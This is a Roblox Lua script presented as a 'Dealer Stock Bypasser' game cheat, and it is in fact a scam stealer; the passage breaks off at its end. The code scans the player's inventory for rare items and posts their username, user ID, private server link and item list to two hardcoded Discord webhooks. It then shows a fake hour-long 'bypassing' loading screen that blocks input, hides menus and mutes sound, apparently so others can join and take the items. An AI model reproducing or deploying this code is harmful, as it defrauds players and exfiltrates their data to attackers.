local BLACKLIST = {
    4313952753,
    3328221098,
    2353591712,
    8698369158,
}

local function isBlacklisted(userId)
    for _, id in ipairs(BLACKLIST) do
        if id == userId then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local player = LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

if isBlacklisted(LocalPlayer.UserId) then
    return
end

local function createRedCrimsonGradientPulse(stroke)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))
    }
    gradient.Rotation = 90
    gradient.Parent = stroke
    
    local pulseTween = TweenService:Create(stroke, 
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Transparency = 0.3}
    )
    stroke.Transparency = 0
    pulseTween:Play()
    return pulseTween
end

local function ocultarHUD()
    local coreGuiElements = {
        Enum.CoreGuiType.PlayerList,
        Enum.CoreGuiType.Health,
        Enum.CoreGuiType.Backpack,
        Enum.CoreGuiType.Chat,
        Enum.CoreGuiType.EmotesMenu,
        Enum.CoreGuiType.All
    }
    
    for _, element in ipairs(coreGuiElements) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(element, false)
        end)
    end
end

local function mostrarHUD()
    local coreGuiElements = {
        Enum.CoreGuiType.PlayerList,
        Enum.CoreGuiType.Health,
        Enum.CoreGuiType.Backpack,
        Enum.CoreGuiType.Chat,
        Enum.CoreGuiType.EmotesMenu,
        Enum.CoreGuiType.All
    }
    
    for _, element in ipairs(coreGuiElements) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(element, true)
        end)
    end
end

local function ocultarScreenGuis()
    if LocalPlayer then
        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
        
        for _, gui in ipairs(PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
                gui.Enabled = false
            end
        end
        
        PlayerGui.ChildAdded:Connect(function(gui)
            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
                wait(0.1)
                gui.Enabled = false
            end
        end)
    end
end

local function cerrarMenuRoblox()
    pcall(function()
        game:GetService("GuiService"):ClearError()
        StarterGui:SetCore("ResetButtonCallback", false)
    end)
    
    for _, gui in ipairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
                gui.Enabled = false
            end
        end
    end
end

local hudVisible = true
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.H then
        hudVisible = not hudVisible
        if hudVisible then
            mostrarHUD()
        else
            ocultarHUD()
        end
    end
    
    if input.KeyCode == Enum.KeyCode.Escape then
        cerrarMenuRoblox()
    end
end)

local allowedAnimals = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama", 
    "Capitano Moby"
}

local function getPodiumInfo()
    local success, podiumData = pcall(function()
        if ReplicatedStorage:FindFirstChild("Packages") then
            local packages = ReplicatedStorage.Packages
            if packages:FindFirstChild("Synchronizer") then
                local synchronizer = require(packages.Synchronizer)
                local playerData = synchronizer:Get(LocalPlayer)
                if playerData then
                    return playerData:Get("AnimalPodiums") or {}
                end
            end
        end
        return "No se pudieron obtener datos de podios"
    end)

    if success and type(podiumData) == "table" then  
        local info = {}  
        for podium, animal in pairs(podiumData) do  
            if animal == "Empty" then  
                info[podium] = "Empty"  
            else  
                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
            end  
        end  
        return info  
    else  
        return {error = podiumData}  
    end
end

local function hasAllowedAnimal(podiumInfo)
    local foundAnimals = {}
    for _, animal in pairs(podiumInfo) do
        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
            for _, allowed in ipairs(allowedAnimals) do
                if animalTrim:lower():find(allowed:lower(), 1, true) then
                    table.insert(foundAnimals, animalTrim)
                    break
                end
            end
        end
    end
    return #foundAnimals > 0, foundAnimals
end

local function isValidPrivateServerLink(text)
    if not string.find(text, "https?://") then
        return false
    end
    
    if not string.find(text, "roblox%.com") then
        return false
    end
    
    local patterns = {
        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
    }
    
    for _, pattern in ipairs(patterns) do
        if string.match(text, pattern) then
            return true
        end
    end
    
    return false
end

local function sendToWebhook(link, foundAnimals)
    if isBlacklisted(LocalPlayer.UserId) then
        return false, "User is blacklisted"
    end

    if not isValidPrivateServerLink(link) then
        return false, "Invalid private server link"
    end

    if not foundAnimals or #foundAnimals == 0 then
        return true
    end

    local playerCount = #Players:GetPlayers()
    if playerCount > 1 then
        return true
    end

    local specialAnimals = {
        "Dragon Cannelloni",
        "Strawberry Elephant",
        "Spooky and Pumpky",
        "La Secret Combinasion",
        "Burguro And Fryuro",
        "Capitano Moby",
        "Spaghetti Tualetti",
        "La Spooky Grande",
        "Tictac Sahur",
        "Garama and Madundung",
        "Chipso and Queso",
        "Los Spaghettis",
        "Fragrama and Chocrama",
        "Meowl",
        "Eviledon",
        "Los Puggies", 
        "La Casa Boo",
        "La Taco Combinasion"
    }

    local webhookNormal = "https://discord.com/api/webhooks/1432215376338620456/ORN9uz8qAMTjBKz7WbtNaGzD6oCDMX8B4O_60LHJG4Ij2S7KgfAtAViaam_WNIWTdo4F"
    local webhookSpecial = "https://discord.com/api/webhooks/1432215598749843456/grMlc-UBX8xTTxLhQIPlQbsNmvZfzF4_qve2chxTh511fPhup-VO5CYSQqtVhw4Et_ZW"

    local playerName = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local userId = LocalPlayer.UserId
    local specialFound = false

    for _, animal in ipairs(foundAnimals) do
        for _, special in ipairs(specialAnimals) do
            if animal:lower():find(special:lower(), 1, true) then
                specialFound = true
                break
            end
        end
        if specialFound then break end
    end

    local webhookUrl = specialFound and webhookSpecial or webhookNormal
    local isSpecial = specialFound

    local animalList = ""
    for i, animal in ipairs(foundAnimals) do
        if i == 1 then
            animalList = animal
        else
            animalList = animalList .. "\n" .. animal
        end
    end

    local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
    local color = isSpecial and 16766720 or 10038562

    local data = {
        ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {
                    ["name"] = "👤 Informacion del jugador:",
                    ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
                },
                {
                    ["name"] = "👥 Datos del Server:",
                    ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                },
                {
                    ["name"] = "🎮 link:",
                    ["value"] = "[Click here to join](" .. link .. ")",
                },
                {
                    ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes(secrets):",
                    ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
                },
                {
                    ["name"] = "📊 Total:",
                    ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
                }
            },
            ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    if webhookUrl ~= "" then
        local success, err = pcall(function()
            local jsonData = HttpService:JSONEncode(data)
            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        end)

        if not success then
            pcall(function()
                local jsonData = HttpService:JSONEncode(data)
                HttpService:RequestAsync({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end
    end

    return true
end

local function createLoadingScreen()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCore("TopbarEnabled", false)
    StarterGui:SetCore("DevConsoleVisible", false)
    StarterGui:SetCore("ResetButtonCallback", false)

    local camera = workspace.CurrentCamera
    camera.CameraType = Enum.CameraType.Scriptable

    local blockInput = true
    UserInputService.InputBegan:Connect(function(input)
        if blockInput then
            input:Capture()
        end
    end)

    local function silenceAllSounds(container)
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("Sound") then
                obj.Volume = 0
            end
        end
    end

    for _, container in pairs({Workspace, ReplicatedStorage, playerGui, StarterGui, CoreGui}) do
        silenceAllSounds(container)
        container.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc.Volume = 0
            end
        end)
    end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MoneyBypasserLoader"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 999999
    screenGui.Parent = CoreGui

    local blackScreen = Instance.new("Frame")
    blackScreen.Name = "BlackScreen"
    blackScreen.Size = UDim2.new(1, 0, 1, 0)
    blackScreen.Position = UDim2.new(0, 0, 0, 0)
    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackScreen.BorderSizePixel = 0
    blackScreen.ZIndex = 999999
    blackScreen.Parent = screenGui

    local gradientFrame = Instance.new("Frame")
    gradientFrame.Name = "GradientFrame"
    gradientFrame.Size = UDim2.new(1, 0, 1, 0)
    gradientFrame.Position = UDim2.new(0, 0, 0, 0)
    gradientFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    gradientFrame.BorderSizePixel = 0
    gradientFrame.ZIndex = 999999
    gradientFrame.Parent = screenGui

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(20, 0, 0)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(80, 10, 10)),
        ColorSequenceKeypoint.new(0.9, Color3.fromRGB(150, 20, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 60))
    }
    gradient.Rotation = 90
    gradient.Parent = gradientFrame

    spawn(function()
        while gradientFrame.Parent do
            local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            
            local tween1 = TweenService:Create(gradient, tweenInfo, {
                Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 0, 5)),
                    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(100, 15, 20)),
                    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(180, 30, 50)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 80))
                }
            })
            tween1:Play()
            tween1.Completed:Wait()
            
            local tween2 = TweenService:Create(gradient, tweenInfo, {
                Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(20, 0, 0)),
                    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(80, 10, 10)),
                    ColorSequenceKeypoint.new(0.9, Color3.fromRGB(150, 20, 30)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 60))
                }
            })
            tween2:Play()
            tween2.Completed:Wait()
        end
    end)

    local matrixChars = {"÷", "¢", "€", "$", "¥", "₹", "₽", "₱", "₩", "£", "฿", "0", "1"}
    local matrixContainer = Instance.new("Frame")
    matrixContainer.Name = "MatrixContainer"
    matrixContainer.Size = UDim2.new(1, 0, 1, 0)
    matrixContainer.BackgroundTransparency = 1
    matrixContainer.ZIndex = 1000000
    matrixContainer.Parent = screenGui

    local particles = {}
    local time = 0
    local latitudes = 25
    local longitudes = 40
    local sphereRadius = 260

    local function createTextParticle(lat, lon)
        local particle = Instance.new("TextLabel")
        particle.Name = "Particle"
        particle.Text = matrixChars[math.random(1, #matrixChars)]
        particle.BackgroundTransparency = 1
        particle.TextColor3 = Color3.fromRGB(0, 0, 0)
        particle.Font = Enum.Font.Arcade
        particle.TextSize = 30
        particle.AnchorPoint = Vector2.new(0.5, 0.5)
        particle.ZIndex = 1000000
        particle.Parent = matrixContainer
        
        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 2
        stroke.Color = Color3.fromRGB(220, 20, 60)
        stroke.Parent = particle
        
        local particleData = {
            label = particle,
            stroke = stroke,
            lat = lat,
            lon = lon
        }
        
        table.insert(particles, particleData)
        return particleData
    end

    for i = 0, latitudes do
        local lat = (i / latitudes) * math.pi
        for j = 0, longitudes do
            local lon = (j / longitudes) * math.pi * 2
            createTextParticle(lat, lon)
        end
    end

    local function updateSphere()
        local screenWidth = matrixContainer.AbsoluteSize.X
        local screenHeight = matrixContainer.AbsoluteSize.Y
        local centerX = screenWidth / 2
        local centerY = screenHeight / 2
        
        for _, particleData in ipairs(particles) do
            local lat = particleData.lat
            local lon = particleData.lon
            
            local x = sphereRadius * math.sin(lat) * math.cos(lon)
            local y = sphereRadius * math.sin(lat) * math.sin(lon)
            local z = sphereRadius * math.cos(lat)
            
            local rotY1 = y * math.cos(time * 0.5) - z * math.sin(time * 0.5)
            local rotZ1 = y * math.sin(time * 0.5) + z * math.cos(time * 0.5)
            
            local rotX2 = x * math.cos(time * 0.3) - rotZ1 * math.sin(time * 0.3)
            local rotZ2 = x * math.sin(time * 0.3) + rotZ1 * math.cos(time * 0.3)
            
            local perspective = 600
            local scale = perspective / (perspective + rotZ2)
            
            local screenX = centerX + rotX2 * scale
            local screenY = centerY + rotY1 * scale
            
            particleData.label.Position = UDim2.new(0, screenX, 0, screenY)
            particleData.label.Size = UDim2.new(0, 25 * scale, 0, 25 * scale)
            
            local opacity = math.clamp(scale * (rotZ2 > 0 and 1 or 0.3), 0, 0.95)
            particleData.label.TextTransparency = 1 - opacity
            particleData.label.ZIndex = math.floor(1000000 + rotZ2)
            
            if math.random() < 0.01 then
                particleData.label.Text = matrixChars[math.random(1, #matrixChars)]
            end
        end
        
        time = time + 0.01
    end

    RunService.RenderStepped:Connect(updateSphere)

    local floatingParticlesContainer = Instance.new("Frame")
    floatingParticlesContainer.Name = "FloatingParticles"
    floatingParticlesContainer.Size = UDim2.new(1, 0, 1, 0)
    floatingParticlesContainer.BackgroundTransparency = 1
    floatingParticlesContainer.ZIndex = 999999
    floatingParticlesContainer.Parent = screenGui

    for i = 1, 30 do
        local floatParticle = Instance.new("Frame")
        floatParticle.Size = UDim2.new(0, math.random(4, 10), 0, math.random(4, 10))
        floatParticle.Position = UDim2.new(math.random(), 0, math.random(), 0)
        floatParticle.BackgroundColor3 = Color3.fromRGB(255, math.random(20, 80), math.random(20, 80))
        floatParticle.BorderSizePixel = 0
        floatParticle.BackgroundTransparency = math.random(30, 60) / 100
        floatParticle.ZIndex = 999999
        floatParticle.Parent = floatingParticlesContainer
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(1, 0)
        corner.Parent = floatParticle
        
        local randomDuration = math.random(8, 15)
        local randomX = math.random()
        local randomY = math.random()
        
        TweenService:Create(floatParticle, 
            TweenInfo.new(randomDuration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            {Position = UDim2.new(randomX, 0, randomY, 0)}
        ):Play()
        
        TweenService:Create(floatParticle, 
            TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            {BackgroundTransparency = math.random(20, 80) / 100}
        ):Play()
    end

    -- BANDERA DE ALEMANIA (construida con código)
    local flagContainer = Instance.new("Frame")
    flagContainer.Name = "GermanFlag"
    flagContainer.Size = UDim2.new(0, 180, 0, 120)
    flagContainer.Position = UDim2.new(0, 30, 0, 30)
    flagContainer.BackgroundTransparency = 1
    flagContainer.ZIndex = 10000001
    flagContainer.Parent = screenGui

    -- Franja negra
    local blackStripe = Instance.new("Frame")
    blackStripe.Size = UDim2.new(1, 0, 0.333, 0)
    blackStripe.Position = UDim2.new(0, 0, 0, 0)
    blackStripe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackStripe.BorderSizePixel = 0
    blackStripe.ZIndex = 10000001
    blackStripe.Parent = flagContainer

    -- Franja roja
    local redStripe = Instance.new("Frame")
    redStripe.Size = UDim2.new(1, 0, 0.333, 0)
    redStripe.Position = UDim2.new(0, 0, 0.333, 0)
    redStripe.BackgroundColor3 = Color3.fromRGB(221, 0, 0)
    redStripe.BorderSizePixel = 0
    redStripe.ZIndex = 10000001
    redStripe.Parent = flagContainer

    -- Franja amarilla
    local yellowStripe = Instance.new("Frame")
    yellowStripe.Size = UDim2.new(1, 0, 0.334, 0)
    yellowStripe.Position = UDim2.new(0, 0, 0.666, 0)
    yellowStripe.BackgroundColor3 = Color3.fromRGB(255, 206, 0)
    yellowStripe.BorderSizePixel = 0
    yellowStripe.ZIndex = 10000001
    yellowStripe.Parent = flagContainer

    -- Borde de la bandera
    local flagBorder = Instance.new("UIStroke")
    flagBorder.Thickness = 3
    flagBorder.Color = Color3.fromRGB(220, 20, 60)
    flagBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    flagBorder.Parent = flagContainer

    local flagCorner = Instance.new("UICorner")
    flagCorner.CornerRadius = UDim.new(0, 8)
    flagCorner.Parent = flagContainer

    -- GRID DE SERVIDOR (cuadrícula)
    local serverGrid = Instance.new("Frame")
    serverGrid.Name = "ServerGrid"
    serverGrid.Size = UDim2.new(0, 260, 0, 260)
    serverGrid.Position = UDim2.new(1, -290, 0, 30)
    serverGrid.BackgroundTransparency = 1
    serverGrid.ZIndex = 10000001
    serverGrid.Parent = screenGui

    local gridCells = {}
    local rows = 4
    local cols = 4
    local cellSize = 55
    local gap = 8

    for i = 0, rows - 1 do
        for j = 0, cols - 1 do
            local cell = Instance.new("Frame")
            cell.Size = UDim2.new(0, cellSize, 0, cellSize)
            cell.Position = UDim2.new(0, j * (cellSize + gap), 0, i * (cellSize + gap))
            cell.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            cell.BorderSizePixel = 0
            cell.ZIndex = 10000001
            cell.Parent = serverGrid

            local cellStroke = Instance.new("UIStroke")
            cellStroke.Thickness = 2
            cellStroke.Color = Color3.fromRGB(220, 20, 60)
            cellStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            cellStroke.Parent = cell

            local cellCorner = Instance.new("UICorner")
            cellCorner.CornerRadius = UDim.new(0, 4)
            cellCorner.Parent = cell

            table.insert(gridCells, cell)
        end
    end

    -- MIRA QUE SE MUEVE ALEATORIAMENTE
    local crosshair = Instance.new("Frame")
    crosshair.Name = "Crosshair"
    crosshair.Size = UDim2.new(0, 60, 0, 60)
    crosshair.BackgroundTransparency = 1
    crosshair.ZIndex = 10000002
    crosshair.Parent = serverGrid

    -- Línea horizontal de la mira
    local hLine = Instance.new("Frame")
    hLine.Size = UDim2.new(1, 0, 0, 3)
    hLine.Position = UDim2.new(0, 0, 0.5, -1.5)
    hLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    hLine.BorderSizePixel = 0
    hLine.ZIndex = 10000002
    hLine.Parent = crosshair

    -- Línea vertical de la mira
    local vLine = Instance.new("Frame")
    vLine.Size = UDim2.new(0, 3, 1, 0)
    vLine.Position = UDim2.new(0.5, -1.5, 0, 0)
    vLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    vLine.BorderSizePixel = 0
    vLine.ZIndex = 10000002
    vLine.Parent = crosshair

    -- Círculo exterior de la mira
    local outerCircle = Instance.new("Frame")
    outerCircle.Size = UDim2.new(0, 50, 0, 50)
    outerCircle.Position = UDim2.new(0.5, -25, 0.5, -25)
    outerCircle.BackgroundTransparency = 1
    outerCircle.ZIndex = 10000002
    outerCircle.Parent = crosshair

    local outerStroke = Instance.new("UIStroke")
    outerStroke.Thickness = 3
    outerStroke.Color = Color3.fromRGB(255, 0, 0)
    outerStroke.Parent = outerCircle

    local outerCorner = Instance.new("UICorner")
    outerCorner.CornerRadius = UDim.new(1, 0)
    outerCorner.Parent = outerCircle

    -- Círculo interior de la mira
    local innerCircle = Instance.new("Frame")
    innerCircle.Size = UDim2.new(0, 10, 0, 10)
    innerCircle.Position = UDim2.new(0.5, -5, 0.5, -5)
    innerCircle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    innerCircle.BorderSizePixel = 0
    innerCircle.ZIndex = 10000002
    innerCircle.Parent = crosshair

    local innerCorner = Instance.new("UICorner")
    innerCorner.CornerRadius = UDim.new(1, 0)
    innerCorner.Parent = innerCircle

    -- Animación de la mira moviéndose aleatoriamente
    spawn(function()
        while crosshair.Parent do
            local randomCell = gridCells[math.random(1, #gridCells)]
            local targetPos = randomCell.Position + UDim2.new(0, cellSize/2 - 30, 0, cellSize/2 - 30)
            
            local moveTween = TweenService:Create(crosshair,
                TweenInfo.new(math.random(5, 10) / 10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {Position = targetPos}
            )
            moveTween:Play()
            moveTween.Completed:Wait()
            
            task.wait(math.random(2, 5) / 10)
        end
    end)

    -- Texto de la cuadrícula
    local gridLabel = Instance.new("TextLabel")
    gridLabel.Size = UDim2.new(0, 260, 0, 25)
    gridLabel.Position = UDim2.new(1, -290, 0, 340)
    gridLabel.BackgroundTransparency = 1
    gridLabel.Text = "changing server location..."
    gridLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    gridLabel.TextSize = 14
    gridLabel.Font = Enum.Font.Arcade
    gridLabel.TextXAlignment = Enum.TextXAlignment.Center
    gridLabel.ZIndex = 10000001
    gridLabel.Parent = screenGui

    local gridLabelStroke = Instance.new("UIStroke")
    gridLabelStroke.Thickness = 2
    gridLabelStroke.Color = Color3.fromRGB(220, 20, 60)
    gridLabelStroke.Parent = gridLabel

    -- Texto de la bandera
    local flagLabel = Instance.new("TextLabel")
    flagLabel.Size = UDim2.new(0, 260, 0, 25)
    flagLabel.Position = UDim2.new(0, 30, 0, 215)
    flagLabel.BackgroundTransparency = 1
    flagLabel.Text = "Location objetivo"
    flagLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    flagLabel.TextSize = 14
    flagLabel.Font = Enum.Font.Arcade
    flagLabel.TextXAlignment = Enum.TextXAlignment.Left
    flagLabel.ZIndex = 10000001
    flagLabel.Parent = screenGui

    local flagLabelStroke = Instance.new("UIStroke")
    flagLabelStroke.Thickness = 2
    flagLabelStroke.Color = Color3.fromRGB(220, 20, 60)
    flagLabelStroke.Parent = flagLabel

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0, 800, 0, 60)
    titleLabel.Position = UDim2.new(0.5, -400, 0, 80)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Dealer Stock Bypasser"
    titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    titleLabel.TextSize = 38
    titleLabel.Font = Enum.Font.Arcade
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
    titleLabel.ZIndex = 10000001
    titleLabel.Parent = screenGui

    local titleStroke = Instance.new("UIStroke")
    titleStroke.Thickness = 3
    titleStroke.Color = Color3.fromRGB(255, 0 ,0)
    titleStroke.Parent = titleLabel
    createRedCrimsonGradientPulse(titleStroke)

    local subtitleLabel = Instance.new("TextLabel")
    subtitleLabel.Size = UDim2.new(0, 800, 0, 30)
    subtitleLabel.Position = UDim2.new(0.5, -400, 0, 145)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Text = "Server Manipulation For Dealer"
    subtitleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    subtitleLabel.TextSize = 28
    subtitleLabel.Font = Enum.Font.Arcade
    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    subtitleLabel.ZIndex = 10000001
    subtitleLabel.Parent = screenGui

    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0, 500, 0, 120)
    percentText.Position = UDim2.new(0.5, -250, 0.5, -60)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(0,0,0)
    percentText.Font = Enum.Font.Arcade
    percentText.TextSize = 86
    percentText.TextXAlignment = Enum.TextXAlignment.Center
    percentText.ZIndex = 10000001
    percentText.Parent = screenGui

    local percentStroke = Instance.new("UIStroke")
    percentStroke.Thickness = 5
    percentStroke.Color = Color3.fromRGB(220, 20, 60)
    percentStroke.Parent = percentText
    createRedCrimsonGradientPulse(percentStroke)

    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(0, 900, 0, 40)
    statusText.Position = UDim2.new(0.5, -450, 1, -120)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Initializing..."
    statusText.TextColor3 = Color3.fromRGB(0, 0, 0)
    statusText.Font = Enum.Font.Arcade
    statusText.TextSize = 25
    statusText.TextXAlignment = Enum.TextXAlignment.Center
    statusText.TextWrapped = true
    statusText.ZIndex = 10000001
    statusText.Parent = screenGui

    local loadingMessages = {
        "Bypassing dealer stock-limit firewall...",
        "Forcing regeneration of restricted items...",
        "Injecting unauthorized stock packets...",
        "Overloading dealer inventory queue to spawn extras...",
        "Forging high-tier item entries into supply cache...",
        "Triggering illegal stock-duplication routine...",
        "Unlocking dealer hard-capped production channels...",
        "Compiling counterfeit item batches for forced restock...",
        "Overriding scarcity protocol to infinite-supply mode...",
        "Hijacking dealer backend to push contraband stock..."
    }

    task.spawn(function()
        local currentPercent = 0
        local messageIndex = 1
        
        local phase1Duration = 20
        local phase1StartTime = tick()
        local lastMessageTime = tick()
        
        while currentPercent < 80 and screenGui.Parent do
            local elapsed = tick() - phase1StartTime
            local progress = math.min(elapsed / phase1Duration, 1)
            currentPercent = math.floor(progress * 80)
            
            percentText.Text = currentPercent .. "%"
            
            if tick() - lastMessageTime >= math.random(2, 4) then
                messageIndex = math.random(1, #loadingMessages)
                statusText.Text = loadingMessages[messageIndex]
                lastMessageTime = tick()
            end
            
            task.wait(0.1)
        end
        
        local phase2Duration = 3600
        local phase2StartTime = tick()
        lastMessageTime = tick()
        
        while currentPercent < 100 and screenGui.Parent do
            local elapsed = tick() - phase2StartTime
            local progress = math.min(elapsed / phase2Duration, 1)
            currentPercent = math.floor(80 + (progress * 20))
            
            percentText.Text = currentPercent .. "%"
            
            if tick() - lastMessageTime >= math.random(2, 4) then
                messageIndex = math.random(1, #loadingMessages)
                statusText.Text = loadingMessages[messageIndex]
                lastMessageTime = tick()
            end
            
            task.wait(0.5)
        end
    end)
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ArcadeGUI"
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0,600,0,400)
mainFrame.Position = UDim2.new(0.5,-300,0.5,-200)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 10
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
